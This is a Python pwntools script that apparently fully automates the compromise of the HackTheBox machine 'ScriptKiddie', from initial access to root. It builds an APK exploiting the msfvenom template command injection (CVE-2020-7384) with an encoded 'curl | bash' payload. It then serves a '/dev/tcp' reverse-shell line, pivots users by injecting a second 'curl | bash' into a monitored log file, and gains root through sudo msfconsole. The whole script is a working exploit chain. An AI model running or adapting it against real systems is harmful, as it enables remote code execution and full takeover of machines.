#!/usr/bin/python3

from pwn import *
import signal,sys,requests,pdb,threading, subprocess, tempfile, os, http.server, socketserver
from base64 import b64encode 

#Ctrl+C 
def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales
url = "http://10.10.10.226:5000/"
burp = {'http': 'http://localhost:8080'}
ip=''

def runHTTPServer():
    PORT = 80
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    httpd.serve_forever()

def makeRequest():

    content = open("evil.apk", "rb")
    file_to_upload = {'template':('evil.apk',content,'application/vnd.android.package-archive')}
    
    data = {
            'os': 'android',
            'lhost': ip,
            'action': 'generate'
            }
    r = requests.post(url, files = file_to_upload, data=data) 

def apkcreate():
    
    # Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
    # Exploit Author: Justin Steven
    # Vendor Homepage: https://www.metasploit.com/
    # Software Link: https://www.metasploit.com/
    # Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
    # CVE : CVE-2020-7384
    
    payload = f'curl {ip} | bash'
    print(payload)
    
    # b64encode to avoid badchars (keytool is picky)
    payload_b64 = b64encode(payload.encode()).decode()
    dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

    #tmpdir = tempfile.mkdtemp()
    apk_file = os.path.join("evil.apk")
    empty_file = os.path.join("empty")
    keystore_file = os.path.join("signing.keystore")
    storepass = keypass = "password"
    key_alias = "signing.key"

    open(empty_file, "w").close()

    # Create apk_file
    subprocess.check_call(["zip", "-j", apk_file, empty_file])

    # Generate signing key with malicious -dname
    subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,"-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

    # Sign APK using our malicious dname
    subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file, "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

def indexcreate():
    f = open("index.html", "w")
    f.write(f"bash -i >& /dev/tcp/{ip}/443 0>&1")
    f.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\nIntroduce tu IP local")
    else:
        ip=sys.argv[1]
        p1 = log.progress("ScriptKiddie autopwn to root user")
        p1.status("msfvenom APK template command injection exploitation (msf 6.0.11)")
        time.sleep(2)
        p1.status("Creando apk malicioso")
        sleep(2)
        apkcreate()
        indexcreate()

        try:
            threading.Thread(target=runHTTPServer, args=()).start()
            try:
                threading.Thread(target=makeRequest, args=()).start()
            except Exception as e:
                log.error(str(e))

            shell = listen(443, timeout=20).wait_for_connection()

            if shell.sock is None:
                p1.failure("Connection couldn't be stablished")
                sys.exit(1)
            else:
                p1.status("Shell gained as 'kid' user")
                sleep(2)
                p1.status("Pivoting to pwn user")
                try: 
                    threading.Thread(target=shell.sendline(f"echo 'x x 127.0.0.1; curl {ip} | bash' > /home/kid/logs/hackers"),args=()).start()
                except Exception as e:
                    log.error(str(e))

                shell = listen(443, timeout=20).wait_for_connection()

                if shell.sock is None:
                    p1.failure("Connection couldn't be stablished")
                    sys.exit(1)
                else:
                    p1.status("Gained shell as pwn")
                    sleep(2)
                    p1.status("Gaining shell as root")
                    shell.sendline(b"sudo /opt/metasploit-framework-6.0.9/msfconsole -x bash")
                    sleep(5)
                    shell.interactive() 
                
        except Exception as e:
            log.error(str(e))
